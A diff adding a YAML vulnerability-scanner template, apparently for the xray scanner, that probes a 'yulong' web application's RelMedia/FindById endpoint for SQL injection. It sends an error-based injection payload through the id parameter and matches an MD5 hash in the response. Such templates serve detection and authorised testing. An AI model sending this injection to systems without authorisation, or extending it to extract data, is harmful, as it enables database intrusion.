@@ -1,0 +1,21 @@
+name: poc-yaml-yulong-RelMedia_FindById-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /index.php?r=RelMedia/FindById
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: id=1+and+updatexml(1,concat(0x7e,MD5(123456),0x7e),1)--+
+    expression: response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487645&idx=1&sn=114868f726b8a42a52d98f24b92ea737&chksm=c267a5aef5102cb8724d40784288c9075e88c9b75042b650b5435076a1c1c857d807a5bf0454&token=1439003696&lang=zh_CN#rd
